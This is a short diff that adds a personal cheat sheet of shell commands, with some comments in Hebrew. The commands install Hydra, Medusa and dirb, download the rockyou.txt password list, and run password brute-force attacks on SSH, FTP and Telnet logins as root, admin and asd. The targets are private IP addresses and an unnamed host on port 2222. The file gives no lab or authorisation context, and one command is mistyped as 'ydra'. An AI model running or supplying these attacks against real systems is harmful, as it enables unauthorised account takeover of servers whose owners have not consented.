@@ -1,0 +1,53 @@
+sudo apt install hydra
+apt install wordlists
+sudo apt install dirb -y
+#list worde
+
+git clone https://github.com/kkrypt0nn/wordlists.git                              
+
+
+ 
+ydra -l root -P  /home/qwe/Desktop/docker/openvad/2/get-in/wordlists/wordlists/passwords/unix_passwords.txt  ssh://10.113.177.120
+ 
+
+
+sudo apt install seclists
+
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O ~/rockyou.txt
+
+
+
+
+#FTP
+hydra -l admin -P ~/rockyou.txt ftp://192.168.1.138 -t 4 -V
+
+#Telnet
+hydra -l admin -P ~/rockyou.txt telnet://192.168.1.138 -t 4 -V
+
+#נסה גם root
+hydra -l root -P ~/rockyou.txt telnet://192.168.1.138 -t 4 -V
+
+
+#ssh 
+hydra -l root -P ~/rockyou.txt ssh://192.168.1.138:22 -t 4 -V
+
+
+hydra -l asd -P ~/rockyou.txt ssh://<ip>:2222 -t 16 -I -f -V
+
+
+###ssh
+sudo apt install medusa 
+
+medusa -h <ip> -n 2222 -u asd -P ~/rockyou.txt -M ssh -t 4 -f 
+
+
+medusa -h <ip> -n 2222 -u asd -P ~/rockyou.txt -M ssh -t 2 -r 1 -f
+
+
+medusa -h <ip> -n 2222 -u asd -P ~/rockyou.txt -M ssh -t 1 -R 3 -r 2 -f
+
+
+
+#עצור את הנוכחי עם Ctrl+C ואז:
+hydra -l admin -P ~/rockyou.txt telnet://192.168.1.138 -t 16 -V
+
